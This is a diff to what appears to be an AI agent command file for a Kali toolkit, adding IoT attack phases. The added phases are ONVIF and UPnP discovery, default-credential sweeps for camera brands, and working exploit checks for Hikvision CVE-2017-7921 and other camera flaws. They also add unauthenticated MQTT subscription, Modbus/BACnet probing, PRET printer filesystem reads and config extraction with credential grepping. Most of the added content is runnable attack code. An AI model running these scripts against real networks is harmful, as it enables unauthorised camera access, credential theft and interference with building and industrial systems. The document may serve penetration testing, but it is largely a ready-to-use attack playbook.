@@ -1,5 +1,5 @@
 ---
-description: IoT/Camera/Router/Printer exploitation — device discovery via MAC OUI, port-based classification, RTSP stream access, brand-specific default credentials (Hikvision/Dahua/Axis/Cisco/TP-Link/MikroTik), known CVE exploitation, SNMP config dump, post-compromise pivot
+description: IoT/Camera/Router/Printer exploitation — device discovery via MAC OUI+ONVIF+UPnP/SSDP, RTSP/ONVIF camera streams, brand-specific default credentials (Hikvision/Dahua/Axis/Amcrest/Reolink/Foscam/Bosch/Uniview/Cisco/MikroTik), CVE exploitation (CVE-2021-36260/CVE-2017-7921/CVE-2017-8225/CVE-2021-33044/CVE-2018-14847), MQTT broker, Modbus/BACnet ICS, PRET printer filesystem, firmware/config extraction
 argument-hint: <subnet|host> (e.g. 192.168.1.0/24 or 192.168.1.100)
 allowed-tools: [mcp__kali-pentest__execute_kali_command, mcp__kali-pentest__execute_parallel]
 ---
@@ -311,6 +311,140 @@ echo "RTSP streams discovered → $ENG/loot/rtsp/streams.txt"
 
 ---
 
+## Phase 3b — ONVIF Camera Discovery
+
+ONVIF is the industry-standard camera protocol — enumerate device info, firmware, and stream profiles via SOAP:
+
+```bash
+ENG=/home/kali/current
+
+echo ""
+echo "=== [Phase 3b] ONVIF Camera Discovery ==="
+echo ""
+
+IOT_HOSTS=$(grep "Nmap scan report" $ENG/scans/iot/iot_ports.txt 2>/dev/null | \
+    grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u)
+
+for host in $IOT_HOSTS; do
+    for port in 80 8080 8899 8000; do
+        result=$(curl -sk --max-time 5 -X POST "http://$host:$port/onvif/device_service" \
+            -H "Content-Type: application/soap+xml" \
+            --data '<?xml version="1.0" encoding="utf-8"?>
+<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">
+<s:Header><wsa:Action xmlns:wsa="http://www.w3.org/2005/08/addressing">http://www.onvif.org/ver10/device/wsdl/GetDeviceInformation</wsa:Action></s:Header>
+<s:Body><GetDeviceInformation xmlns="http://www.onvif.org/ver10/device/wsdl"/></s:Body></s:Envelope>' 2>/dev/null)
+
+        echo "$result" | grep -qi "manufacturer\|model\|firmware" && {
+            mfr=$(echo "$result" | grep -oP '(?<=<tt:Manufacturer>)[^<]+' | head -1)
+            model=$(echo "$result" | grep -oP '(?<=<tt:Model>)[^<]+' | head -1)
+            fw=$(echo "$result" | grep -oP '(?<=<tt:FirmwareVersion>)[^<]+' | head -1)
+            serial=$(echo "$result" | grep -oP '(?<=<tt:SerialNumber>)[^<]+' | head -1)
+            echo "  [ONVIF] $host:$port | $mfr $model | FW: $fw | Serial: $serial"
+            echo "  [ONVIF] $host $mfr $model FW:$fw" >> $ENG/scans/iot/onvif_devices.txt
+
+            # Get stream profiles (reveals RTSP URIs)
+            profiles=$(curl -sk --max-time 5 -X POST "http://$host:$port/onvif/media_service" \
+                -H "Content-Type: application/soap+xml" \
+                --data '<?xml version="1.0"?><s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"><s:Body><GetProfiles xmlns="http://www.onvif.org/ver10/media/wsdl"/></s:Body></s:Envelope>' 2>/dev/null)
+            profile_token=$(echo "$profiles" | grep -oP '(?<=token=")[^"]+' | head -1)
+            echo "  Stream profile: $profile_token"
+
+            # Get stream URI for the profile
+            [ -n "$profile_token" ] && {
+                stream_uri=$(curl -sk --max-time 5 -X POST "http://$host:$port/onvif/media_service" \
+                    -H "Content-Type: application/soap+xml" \
+                    --data "<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\"><s:Body><GetStreamUri xmlns=\"http://www.onvif.org/ver10/media/wsdl\"><StreamSetup><Stream>RTP-Unicast</Stream><Transport><Protocol>RTSP</Protocol></Transport></StreamSetup><ProfileToken>$profile_token</ProfileToken></GetStreamUri></s:Body></s:Envelope>" 2>/dev/null | \
+                    grep -oP '(?<=<tt:Uri>)[^<]+' | head -1)
+                [ -n "$stream_uri" ] && echo "  RTSP URI: $stream_uri" && \
+                    echo "$stream_uri" >> $ENG/loot/rtsp/streams.txt
+            }
+
+            # Try unauthenticated snapshot
+            snapshot=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" \
+                "http://$host:$port/onvif/snapshot" 2>/dev/null)
+            [ "$snapshot" = "200" ] && echo "  [!] Unauthenticated snapshot: http://$host:$port/onvif/snapshot"
+        }
+    done
+done
+
+[ -s $ENG/scans/iot/onvif_devices.txt ] && {
+    echo ""
+    echo "ONVIF cameras discovered:"
+    cat $ENG/scans/iot/onvif_devices.txt
+} || echo "No ONVIF responses (not all cameras implement it — check RTSP directly)"
+```
+
+---
+
+## Phase 3c — UPnP/SSDP Device Discovery
+
+SSDP multicast reveals all UPnP devices: routers, NAS, smart TVs, Chromecast, printers that respond to normal port scans inconsistently:
+
+```bash
+ENG=/home/kali/current
+IFACE=$(ip route get 8.8.8.8 2>/dev/null | grep -oP 'dev \K\S+' | head -1)
+
+echo ""
+echo "=== [Phase 3c] UPnP/SSDP Device Discovery ==="
+echo ""
+
+mkdir -p $ENG/scans/iot
+
+# SSDP M-SEARCH multicast — discovers ALL UPnP devices including those that don't respond to ARP
+python3 << 'PYEOF'
+import socket, time
+
+msg = b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 3\r\nST: ssdp:all\r\n\r\n'
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.settimeout(5)
+s.sendto(msg, ('239.255.255.250', 1900))
+
+discovered = {}
+print("UPnP/SSDP devices (5s listen):")
+end = time.time() + 5
+while time.time() < end:
+    try:
+        data, addr = s.recvfrom(4096)
+        ip = addr[0]
+        if ip in discovered:
+            continue
+        discovered[ip] = True
+        text = data.decode(errors='replace')
+        location = next((l.split(':', 1)[1].strip() for l in text.split('\r\n') if l.upper().startswith('LOCATION:')), '')
+        server = next((l.split(':', 1)[1].strip() for l in text.split('\r\n') if l.upper().startswith('SERVER:')), '')
+        usn = next((l.split(':', 1)[1].strip() for l in text.split('\r\n') if l.upper().startswith('USN:')), '')
+        print(f"  {ip:16} | {server[:40]:40} | {location[:50]}")
+        with open('/home/kali/current/scans/iot/upnp_devices.txt', 'a') as f:
+            f.write(f"{ip}|{server}|{location}|{usn}\n")
+    except socket.timeout:
+        break
+    except Exception:
+        pass
+s.close()
+print(f"Total UPnP devices: {len(discovered)}")
+PYEOF
+
+# Fetch rootDesc.xml from each device (contains model name, firmware, internal IPs)
+echo ""
+echo "--- Fetching UPnP device descriptions ---"
+while IFS='|' read -r ip server location usn; do
+    [ -z "$location" ] && continue
+    result=$(curl -sk --max-time 5 "$location" 2>/dev/null)
+    echo "$result" | grep -qi "device\|model\|manufacturer" && {
+        model=$(echo "$result" | grep -oP '(?<=<modelName>)[^<]+' | head -1)
+        mfr=$(echo "$result" | grep -oP '(?<=<manufacturer>)[^<]+' | head -1)
+        fw=$(echo "$result" | grep -oP '(?<=<modelNumber>)[^<]+' | head -1)
+        pres=$(echo "$result" | grep -oP '(?<=<presentationURL>)[^<]+' | head -1)
+        internal_ip=$(echo "$result" | grep -oP '\b10\.\d+\.\d+\.\d+|\b172\.(1[6-9]|2[0-9]|3[0-1])\.\d+\.\d+|\b192\.168\.\d+\.\d+' | grep -v "^$ip$" | head -1)
+        echo "  $ip | $mfr $model (FW: $fw) | Admin: $pres"
+        [ -n "$internal_ip" ] && echo "  [!] Internal IP leaked in XML: $internal_ip"
+    }
+done < $ENG/scans/iot/upnp_devices.txt 2>/dev/null
+```
+
+---
+
 ## Phase 4 — Default Credential Sweep (Brand-Specific)
 
 Test brand-specific default credentials on every discovered device:
@@ -399,6 +533,62 @@ for host in $IOT_HOSTS; do
             u=$(echo $cred | cut -d: -f1); p=$(echo $cred | cut -d: -f2)
             test_web_creds "$host" "$port" "$u" "$p" "$proto" && \
                 echo "    Dahua $host $u:$p" >> $ENG/loot/iot/found_creds.txt && break
+        done
+
+        # Amcrest defaults
+        for cred in "admin:admin" "admin:password" "admin:amcrest"; do
+            u=$(echo $cred | cut -d: -f1); p=$(echo $cred | cut -d: -f2)
+            test_web_creds "$host" "$port" "$u" "$p" "$proto" && \
+                echo "    Amcrest $host $u:$p" >> $ENG/loot/iot/found_creds.txt && break
+        done
+
+        # Reolink defaults
+        for cred in "admin:" "admin:12345678" "admin:reolink"; do
+            u=$(echo $cred | cut -d: -f1); p=$(echo $cred | cut -d: -f2)
+            test_web_creds "$host" "$port" "$u" "$p" "$proto" && \
+                echo "    Reolink $host $u:$p" >> $ENG/loot/iot/found_creds.txt && break
+        done
+
+        # Foscam defaults
+        for cred in "admin:" "admin:admin" "admin:foscam"; do
+            u=$(echo $cred | cut -d: -f1); p=$(echo $cred | cut -d: -f2)
+            test_web_creds "$host" "$port" "$u" "$p" "$proto" && \
+                echo "    Foscam $host $u:$p" >> $ENG/loot/iot/found_creds.txt && break
+        done
+
+        # Tapo (TP-Link) defaults
+        for cred in "admin:admin123" "admin:tplink" "admin:admin"; do
+            u=$(echo $cred | cut -d: -f1); p=$(echo $cred | cut -d: -f2)
+            test_web_creds "$host" "$port" "$u" "$p" "$proto" && \
+                echo "    Tapo $host $u:$p" >> $ENG/loot/iot/found_creds.txt && break
+        done
+
+        # Bosch defaults
+        for cred in "admin:admin" "service:service" "user:user"; do
+            u=$(echo $cred | cut -d: -f1); p=$(echo $cred | cut -d: -f2)
+            test_web_creds "$host" "$port" "$u" "$p" "$proto" && \
+                echo "    Bosch $host $u:$p" >> $ENG/loot/iot/found_creds.txt && break
+        done
+
+        # Uniview defaults
+        for cred in "admin:123456" "admin:admin" "admin:Uniview1"; do
+            u=$(echo $cred | cut -d: -f1); p=$(echo $cred | cut -d: -f2)
+            test_web_creds "$host" "$port" "$u" "$p" "$proto" && \
+                echo "    Uniview $host $u:$p" >> $ENG/loot/iot/found_creds.txt && break
+        done
+
+        # Vivotek defaults
+        for cred in "root:admin" "root:" "admin:admin"; do
+            u=$(echo $cred | cut -d: -f1); p=$(echo $cred | cut -d: -f2)
+            test_web_creds "$host" "$port" "$u" "$p" "$proto" && \
+                echo "    Vivotek $host $u:$p" >> $ENG/loot/iot/found_creds.txt && break
+        done
+
+        # IndigoVision defaults
+        for cred in "administrator:" "admin:" "admin:admin"; do
+            u=$(echo $cred | cut -d: -f1); p=$(echo $cred | cut -d: -f2)
+            test_web_creds "$host" "$port" "$u" "$p" "$proto" && \
+                echo "    IndigoVision $host $u:$p" >> $ENG/loot/iot/found_creds.txt && break
         done
 
         # Router defaults
@@ -562,6 +752,82 @@ PYEOF
         fi
     done
 
+    # --- CVE-2017-7921: Hikvision Auth Bypass (FW < 5.4.0) ---
+    # Affects older Hikvision cameras — authentication bypass via crafted URL
+    for port in 80 8080 443; do
+        echo "$PORT_FILE" | grep -q "${port}/tcp.*open" || continue
+        proto="http"; [ "$port" = "443" ] && proto="https"
+
+        # Bypass check 1: userList endpoint with hardcoded auth string
+        RESULT=$(curl -sk --max-time 8 "$proto://$host:$port/Security/users?auth=YWRtaW46MTEM" 2>/dev/null)
+        echo "$RESULT" | grep -qi "admin\|user\|password\|userName" && {
+            echo "  [CVE-2017-7921] $host:$port VULNERABLE — auth bypass confirmed"
+            echo "  Exposed users: $(echo $RESULT | grep -oP 'userName>[^<]+' | head -3)"
+            echo "$host HTTP CVE-2017-7921 AUTH-BYPASS" >> $ENG/loot/iot/cve_findings.txt
+        }
+
+        # Bypass check 2: ISAPI Security users endpoint
+        RESULT2=$(curl -sk --max-time 8 "$proto://$host:$port/ISAPI/Security/users" \
+            -H "Authorization: Basic YWRtaW46MTEM" 2>/dev/null)
+        echo "$RESULT2" | grep -qi "loginUser\|userName" && {
+            echo "  [CVE-2017-7921] ISAPI endpoint exposed on $host:$port"
+            echo "$host ISAPI CVE-2017-7921" >> $ENG/loot/iot/cve_findings.txt
+        }
+
+        # Config file download without auth (older models)
+        RESULT3=$(curl -sk --max-time 8 -o /tmp/hik_cfg_$host.bin -w "%{http_code}" \
+            "$proto://$host:$port/ISAPI/System/configurationData" 2>/dev/null)
+        [ "$RESULT3" = "200" ] && {
+            SZ=$(wc -c < /tmp/hik_cfg_$host.bin)
+            [ "$SZ" -gt 100 ] && {
+                echo "  [CVE-2017-7921] Config file downloaded: ${SZ} bytes — $proto://$host:$port/ISAPI/System/configurationData"
+                strings /tmp/hik_cfg_$host.bin 2>/dev/null | grep -iE "password|admin|ssid|wifi" | head -5
+                echo "$host CONFIG-LEAK CVE-2017-7921" >> $ENG/loot/iot/cve_findings.txt
+            }
+        }
+    done
+
+    # --- CVE-2017-8225: Netwave/GoAhead IP camera credential leak ---
+    # Affects generic OEM cameras using GoAhead web server
+    for port in 80 8080; do
+        echo "$PORT_FILE" | grep -q "${port}/tcp.*open" || continue
+
+        # /proc/kcore contains credentials in memory-mapped process space
+        RESULT=$(curl -sk --max-time 5 "http://$host:$port/proc/kcore" 2>/dev/null | \
+            strings | grep -iE "admin|password|user" | head -5)
+        [ -n "$RESULT" ] && {
+            echo "  [CVE-2017-8225] $host:$port — /proc/kcore credential leak:"
+            echo "$RESULT" | head -5 | sed 's/^/    /'
+            echo "$host PROC-KCORE CVE-2017-8225" >> $ENG/loot/iot/cve_findings.txt
+        }
+
+        # /userinfo.htm exposes credentials directly
+        RESULT2=$(curl -sk --max-time 5 "http://$host:$port/userinfo.htm" 2>/dev/null)
+        echo "$RESULT2" | grep -qiE "user|pass|pwd|admin" && {
+            echo "  [CVE-2017-8225] userinfo.htm exposed on $host:$port:"
+            echo "$RESULT2" | grep -iE "user|pass|pwd" | head -5 | sed 's/^/    /'
+            echo "$host USERINFO CVE-2017-8225" >> $ENG/loot/iot/cve_findings.txt
+        }
+    done
+
+    # --- Amcrest CVE-2022-30563: Replay/nonce auth bypass ---
+    for port in 80 8080; do
+        echo "$PORT_FILE" | grep -q "${port}/tcp.*open" || continue
+        # Check for Amcrest digest auth nonce
+        NONCE=$(curl -sk -I --max-time 5 "http://$host:$port/cgi-bin/snapshot.cgi" 2>/dev/null | \
+            grep -i "WWW-Authenticate" | grep -oP 'nonce="\K[^"]+' | head -1)
+        [ -n "$NONCE" ] && {
+            echo "  [Amcrest] $host:$port — Digest auth nonce: $NONCE"
+            echo "  Testing CVE-2022-30563 (stale nonce reuse bypass)..."
+            # Try replaying with empty credentials using leaked nonce
+            RESULT=$(curl -sk --max-time 5 "http://$host:$port/cgi-bin/snapshot.cgi" \
+                --digest -u "admin:" \
+                --header "Authorization: Digest username=\"admin\",realm=\"Login to admin\",nonce=\"$NONCE\",uri=\"/cgi-bin/snapshot.cgi\",qop=auth,nc=00000001,cnonce=\"deadbeef\",response=\"0000000000000000000000000000000000000000\"" \
+                -o /tmp/amcrest_snap_$host.jpg -w "%{http_code}" 2>/dev/null)
+            [ "$RESULT" = "200" ] && echo "  [!] Amcrest snapshot captured without valid auth!"
+        }
+    done
+
     # --- Printer exploitation ---
     if echo "$PORT_FILE" | grep -q "9100/tcp.*open"; then
         echo "  [Printer JetDirect] $host:9100 — Testing direct print access..."
@@ -578,6 +844,168 @@ echo ""
 echo "CVE findings → $ENG/loot/iot/cve_findings.txt"
 [ -s $ENG/loot/iot/cve_findings.txt ] && cat $ENG/loot/iot/cve_findings.txt || echo "(no CVEs confirmed)"
 ```
+
+---
+
+## Phase 5b — MQTT Broker Exploitation
+
+MQTT is the standard IoT messaging protocol — an unauthenticated broker exposes all device telemetry, commands, and sometimes credentials:
+
+```bash
+ENG=/home/kali/current
+
+echo ""
+echo "=== [Phase 5b] MQTT Broker Exploitation ==="
+echo ""
+
+mkdir -p $ENG/loot/iot
+
+IOT_HOSTS=$(grep "Nmap scan report" $ENG/scans/iot/iot_ports.txt 2>/dev/null | \
+    grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u)
+
+# Install mosquitto clients if needed
+which mosquitto_sub 2>/dev/null || apt-get install -y mosquitto-clients 2>/dev/null
+
+for host in $IOT_HOSTS; do
+    # Check MQTT ports (1883 plain, 8883 TLS, 9001 WebSocket)
+    for port in 1883 8883 9001; do
+        nc -zw2 $host $port 2>/dev/null || continue
+
+        echo "  [MQTT] $host:$port — broker detected"
+
+        # Try unauthenticated subscription to ALL topics (wildcard #)
+        MQTT_OUTPUT=$(timeout 10 mosquitto_sub -h "$host" -p "$port" -t '#' -v \
+            --keepalive 5 2>/dev/null | head -30)
+
+        if [ -n "$MQTT_OUTPUT" ]; then
+            echo "  [!] UNAUTHENTICATED MQTT ACCESS — all topics visible:"
+            echo "$MQTT_OUTPUT" | head -15 | sed 's/^/    /'
+            echo "$MQTT_OUTPUT" > $ENG/loot/iot/mqtt_${host//./_}_${port}.txt
+            echo "$host MQTT $port UNAUTHENTICATED" >> $ENG/loot/iot/cve_findings.txt
+        else
+            echo "  Auth required — trying common credentials..."
+            for cred in "admin:admin" "admin:password" "user:user" "mqtt:mqtt" \
+                        "root:root" "guest:guest" "mosquitto:mosquitto"; do
+                u=$(echo $cred | cut -d: -f1)
+                p=$(echo $cred | cut -d: -f2)
+                RESULT=$(timeout 6 mosquitto_sub -h "$host" -p "$port" -t '#' -v \
+                    -u "$u" -P "$p" --keepalive 5 2>/dev/null | head -5)
+                [ -n "$RESULT" ] && {
+                    echo "  [+] MQTT creds: $u:$p"
+                    echo "$RESULT" | head -5 | sed 's/^/    /'
+                    echo "$host MQTT $port $u:$p" >> $ENG/loot/iot/found_creds.txt
+                    break
+                }
+            done
+        fi
+
+        # Try to get broker info via $SYS topics (always public on many brokers)
+        echo "  Broker system info:"
+        timeout 5 mosquitto_sub -h "$host" -p "$port" -t '$SYS/#' -v 2>/dev/null | \
+            head -10 | sed 's/^/    /'
+    done
+done
+
+echo ""
+echo "MQTT loot → $ENG/loot/iot/"
+ls $ENG/loot/iot/mqtt_*.txt 2>/dev/null | head -5
+```
+
+---
+
+## Phase 5c — Industrial Protocol Discovery (Modbus/BACnet/EtherNet-IP)
+
+ICS/SCADA devices on network segments — read-only enumeration only (writing Modbus registers can cause physical damage):
+
+```bash
+ENG=/home/kali/current
+
+echo ""
+echo "=== [Phase 5c] Industrial Protocol Discovery ==="
+echo ""
+echo "[!] WARNING: Only enumerate — never write to Modbus/BACnet without explicit authorization"
+echo ""
+
+IOT_HOSTS=$(grep "Nmap scan report" $ENG/scans/iot/iot_ports.txt 2>/dev/null | \
+    grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u)
+
+# --- Modbus TCP port 502 ---
+echo "--- Modbus TCP (port 502 — ICS/SCADA PLCs) ---"
+for host in $IOT_HOSTS; do
+    nc -zw2 $host 502 2>/dev/null || continue
+
+    echo "  [MODBUS] $host:502 — ICS device detected"
+    echo "  [!] This is an industrial control system — ENUMERATE ONLY"
+
+    # Read device identification (function code 43, MEI type 14)
+    python3 << PYEOF
+import socket
+
+host = "$host"
+try:
+    s = socket.socket()
+    s.settimeout(5)
+    s.connect((host, 502))
+    # Modbus TCP Read Holding Registers (FC03) — unit 1, start 0, count 10
+    req = bytes([0x00,0x01, 0x00,0x00, 0x00,0x06, 0x01, 0x03, 0x00,0x00, 0x00,0x0a])
+    s.send(req)
+    resp = s.recv(256)
+    if len(resp) > 9:
+        regs = [int.from_bytes(resp[9+i*2:11+i*2], 'big') for i in range(min(10,(len(resp)-9)//2))]
+        print(f"    Holding registers 0-9: {regs}")
+    # Device ID request (FC43)
+    req2 = bytes([0x00,0x01, 0x00,0x00, 0x00,0x05, 0xFF, 0x2B, 0x0E, 0x01, 0x00])
+    s.send(req2)
+    resp2 = s.recv(256)
+    if len(resp2) > 8:
+        try:
+            print(f"    Device ID response: {resp2[8:].decode('latin-1', errors='replace')[:80]}")
+        except: pass
+    s.close()
+except Exception as e:
+    print(f"    Error: {e}")
+PYEOF
+
+    echo "  Tool: pip3 install mbtget → mbtget -r3 -a 0 -l 10 $host  (read registers)"
+    echo "  Tool: nmap -sV -p 502 --script modbus-discover $host"
+done
+
+# --- BACnet UDP port 47808 ---
+echo ""
+echo "--- BACnet (port 47808 UDP — building automation: HVAC/lighting/access) ---"
+for host in $IOT_HOSTS; do
+    python3 << PYEOF
+import socket
+
+host = "$host"
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.settimeout(3)
+    # BACnet Who-Is broadcast (discover all BACnet devices)
+    bacnet_whois = bytes([0x81,0x0b,0x00,0x0c, 0x01,0x20,0xff,0xff,0x00,0xff, 0x10,0x08])
+    s.sendto(bacnet_whois, (host, 47808))
+    try:
+        data, addr = s.recvfrom(1024)
+        print(f"  [BACNET] {addr[0]} — building automation device: {data.hex()[:40]}")
+        print(f"  [!] HVAC/lighting/physical access control — report to client immediately")
+    except socket.timeout:
+        pass
+    s.close()
+except Exception as e:
+    pass
+PYEOF
+done
+
+# --- EtherNet/IP port 44818 ---
+echo ""
+echo "--- EtherNet/IP (port 44818 — Rockwell/Allen-Bradley PLCs) ---"
+for host in $IOT_HOSTS; do
+    nc -zw2 $host 44818 2>/dev/null && {
+        echo "  [ETHERNET/IP] $host:44818 — industrial Ethernet PLC detected"
+        echo "  Tool: python3 /opt/cpppo/cpppo.py --server $host list"
+        nmap -sV -p 44818 --script enip-info $host 2>/dev/null | grep -E "vendor|product|revision|serial" | head -5
+    }
+done
 
 ---
 
@@ -669,6 +1097,196 @@ done
 
 ---
 
+## Phase 7b — Printer Exploitation (PRET)
+
+Printers are gold mines: stored credentials, scanned documents, internal network topology, filesystem access:
+
+```bash
+ENG=/home/kali/current
+
+echo ""
+echo "=== [Phase 7b] Printer Exploitation (PRET) ==="
+echo ""
+
+# Get PRET
+PRET_PATH="/opt/pret"
+if [ ! -f "$PRET_PATH/pret.py" ]; then
+    echo "Installing PRET..."
+    git clone https://github.com/RUB-NDS/PRET $PRET_PATH 2>/dev/null
+    pip3 install colorama 2>/dev/null
+fi
+PRET="python3 $PRET_PATH/pret.py"
+
+# Find printers from port scan
+PRINTER_HOSTS=$(grep -B5 "9100/tcp.*open\|631/tcp.*open\|515/tcp.*open" \
+    $ENG/scans/iot/iot_ports.txt 2>/dev/null | grep "Nmap scan report" | \
+    grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u)
+
+[ -z "$PRINTER_HOSTS" ] && {
+    echo "No printers detected in port scan — check Phase 2 classification results."
+}
+
+for host in $PRINTER_HOSTS; do
+    echo "--- Printer: $host ---"
+    PORT_FILE=$(grep -A40 "$host" $ENG/scans/iot/iot_ports.txt 2>/dev/null | head -40)
+
+    # IPP (Internet Printing Protocol) — port 631 — safe enumeration
+    if echo "$PORT_FILE" | grep -q "631/tcp.*open"; then
+        echo "  IPP (port 631) — enumerating print queue..."
+        curl -sk "http://$host:631/printers/" 2>/dev/null | \
+            grep -oP '(?<=<b>)[^<]+|href="[^"]*printer[^"]*"' | head -10
+        curl -sk "http://$host:631/admin/" 2>/dev/null | \
+            grep -qi "admin\|config\|password" && echo "  [!] IPP admin accessible"
+    fi
+
+    # Test all 3 PJL/PostScript/PCL printer languages via PRET
+    for lang in pjl ps pcl; do
+        echo "  Testing $lang language..."
+        PRET_RESULT=$(timeout 15 $PRET $host $lang -q << 'PJLCMD' 2>/dev/null
+id
+ls
+env
+exit
+PJLCMD
+        )
+
+        echo "$PRET_RESULT" | grep -qvE "^$|^\[" && {
+            echo "  [$lang] Accessible on $host"
+            echo "$PRET_RESULT" | head -10 | sed 's/^/    /'
+
+            # PJL is most powerful — try filesystem access
+            if [ "$lang" = "pjl" ]; then
+                echo "  [PJL] Attempting filesystem access..."
+                timeout 15 $PRET $host pjl -q << 'PJLFS' 2>/dev/null | head -20
+fsdirlist volume=0:/
+fsdirlist volume=0:/etc/
+fsdownload volume=0:/etc/passwd
+exit
+PJLFS
+                # Check for stored print jobs (may contain sensitive documents)
+                timeout 10 $PRET $host pjl -q << 'PJLJOBS' 2>/dev/null | head -10
+info variables
+exit
+PJLJOBS
+            fi
+
+            # PostScript — more dangerous, allows arbitrary code execution
+            if [ "$lang" = "ps" ]; then
+                echo "  [PS] Testing PostScript capabilities..."
+                timeout 10 $PRET $host ps -q << 'PSCMD' 2>/dev/null | head -10
+systemdict /statusdict known { statusdict begin revision end } if
+() =
+exit
+PSCMD
+            fi
+
+            echo "$host PRINTER $lang ACCESSIBLE" >> $ENG/loot/iot/cve_findings.txt
+            timeout 20 $PRET $host $lang -q << 'PJLDUMP' 2>/dev/null | \
+                tee $ENG/loot/iot/printer_${host//./_}_${lang}.txt | wc -l | \
+                xargs -I{} echo "  {} lines dumped to $ENG/loot/iot/printer_${host//./_}_${lang}.txt"
+id
+ls
+env
+exit
+PJLDUMP
+            break  # Found working language
+        }
+    done
+    echo ""
+done
+```
+
+---
+
+## Phase 7c — Firmware & Config Extraction
+
+Many IoT devices expose their configuration via TFTP or HTTP — extract for offline analysis and credential recovery:
+
+```bash
+ENG=/home/kali/current
+
+echo ""
+echo "=== [Phase 7c] Firmware & Config Extraction ==="
+echo ""
+
+IOT_HOSTS=$(grep "Nmap scan report" $ENG/scans/iot/iot_ports.txt 2>/dev/null | \
+    grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u)
+
+mkdir -p $ENG/loot/iot/firmware
+
+for host in $IOT_HOSTS; do
+    echo "--- $host ---"
+
+    # TFTP (port 69 UDP) — routers/switches often serve config via TFTP for auto-provisioning
+    nc -uzw2 $host 69 2>/dev/null && {
+        echo "  [TFTP] $host:69 — attempting config file download..."
+        for filename in "startup-config" "running-config" "config.bin" "nvram" \
+                        "backup.cfg" "default.cfg" "system.cfg" "router.conf" \
+                        "switch.cfg" "firmware.bin"; do
+            DEST="$ENG/loot/iot/firmware/tftp_${host//./_}_${filename}"
+            timeout 8 tftp $host -m binary -c get "$filename" "$DEST" 2>/dev/null
+            [ -f "$DEST" ] && [ "$(wc -c < $DEST)" -gt 50 ] && {
+                SZ=$(wc -c < "$DEST")
+                echo "  [+] TFTP: $filename ($SZ bytes)"
+                # Extract credentials from config
+                strings "$DEST" 2>/dev/null | \
+                    grep -iE "password|passwd|secret|enable|key|community|user" | \
+                    grep -v "^$" | head -10 | sed 's/^/      /'
+            } || rm -f "$DEST" 2>/dev/null
+        done
+    }
+
+    # HTTP config backup endpoints — vendor-specific
+    for path in \
+        "/backup.cfg" "/config.bin" "/settings.dat" "/configuration.bin" \
+        "/admin/backup" "/cgi-bin/export_config.cgi" \
+        "/ISAPI/System/configurationData" "/ISAPI/System/configurationFile" \
+        "/api/backup" "/management/config/backup" \
+        "/cgi-bin/download_config.asp" "/userRpm/config.bin" \
+        "/goform/getSysConf" "/setting.dat" "/romfile.cfg" \
+        "/config/download" "/nvrambackup"; do
+
+        for port in 80 8080 443 8443; do
+            code=$(curl -sk -o "$ENG/loot/iot/firmware/http_${host//./_}_${port}${path//\//_}.bin" \
+                -w "%{http_code}" --max-time 8 "http://$host:$port$path" 2>/dev/null)
+            DEST="$ENG/loot/iot/firmware/http_${host//./_}_${port}${path//\//_}.bin"
+            [ "$code" = "200" ] && [ -f "$DEST" ] && {
+                SZ=$(wc -c < "$DEST")
+                [ "$SZ" -gt 100 ] && {
+                    echo "  [+] Config: http://$host:$port$path ($SZ bytes)"
+                    # Extract interesting strings from binary config
+                    strings "$DEST" 2>/dev/null | \
+                        grep -iE "password|passwd|ssid|wpa|wifi|admin|user|secret|key" | \
+                        grep -v "^$" | head -8 | sed 's/^/      /'
+
+                    # Check if it's a Cisco IOS config (plain text)
+                    grep -qi "hostname\|interface\|enable secret" "$DEST" 2>/dev/null && {
+                        echo "  [Cisco IOS config found!]"
+                        grep -iE "enable (secret|password)|username|community" "$DEST" | head -5
+                    }
+                } || rm -f "$DEST" 2>/dev/null
+            } || rm -f "$DEST" 2>/dev/null
+        done
+    done
+done
+
+echo ""
+echo "Extracted configs → $ENG/loot/iot/firmware/"
+ls -la $ENG/loot/iot/firmware/ 2>/dev/null | grep -v "^total" | head -20
+
+# Run binwalk on binary configs to extract embedded firmware
+which binwalk 2>/dev/null && {
+    for f in $ENG/loot/iot/firmware/*.bin; do
+        [ -f "$f" ] && [ "$(wc -c < $f)" -gt 1000 ] && {
+            echo "  Running binwalk on $(basename $f)..."
+            binwalk -e "$f" --directory="$ENG/loot/iot/firmware/extracted/" 2>/dev/null | head -10
+        }
+    done
+}
+```
+
+---
+
 ## Phase 8 — Post-Compromise
 
 After successful compromise, escalate and pivot:
@@ -747,8 +1365,15 @@ NOTES
 ## Execution Rules
 
 - **Always run Phase 1+2 together** — OUI + port classification gives the attack priority
+- **Run Phase 3b (ONVIF) after RTSP** — ONVIF reveals model/firmware/stream URI without guessing paths
+- **Run Phase 3c (UPnP/SSDP) always** — finds devices invisible to ARP scan (printers, NAS, smart TVs)
 - **RTSP first** (Phase 3) — a working RTSP stream is an instant deliverable in any report
 - **CVEs before brute force** (Phase 5 before Phase 4) — CVE-2021-36260 needs no creds at all
+- **CVE-2017-7921 on any Hikvision** — still unpatched on thousands of cameras worldwide
+- **MQTT Phase 5b always** — unauthenticated brokers expose all device telemetry and commands
+- **ICS/SCADA Phase 5c** — Modbus port 502 on internal segments = report-worthy critical finding
+- **PRET Phase 7b on any printer** — filesystem access recovers stored credentials and print jobs
+- **Phase 7c firmware extraction** — TFTP configs often contain plain-text WiFi PSK and enable secrets
 - **SNMP is gold** — it can expose WiFi PSK, routing tables, VLANs — always try public/private
 - **Routersploit** covers hundreds of router CVEs automatically — let it run
 - **Post-compromise pivot** — cameras often sit on their own VLAN with access to other cameras; map it
